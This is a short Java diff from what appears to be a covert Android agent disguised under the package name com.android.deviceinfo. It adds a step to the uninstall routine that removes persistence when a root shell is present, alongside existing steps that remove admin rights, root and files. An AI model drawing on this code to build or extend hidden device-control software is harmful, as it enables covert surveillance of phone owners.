@@ -16,6 +16,7 @@ import android.content.Intent;
 import android.net.Uri;
 
 import com.android.deviceinfo.Beep;
+import com.android.deviceinfo.Persistence;
 import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
@@ -72,9 +73,14 @@ public class UninstallAction extends SubActionSlow {
 
 		removeAdmin(Status.getAppContext());
 
+		if (Root.isRootShellInstalled()) {
+			Persistence p = new Persistence(Status.getAppContext());
+			p.removePersistance();
+		}
+		
 		boolean ret = stopServices();
 		ret &= removeFiles();
-		ret &= deleteApplication();
+		ret &= deleteApplication();	
 		ret &= removeRoot();
 
 		return ret;
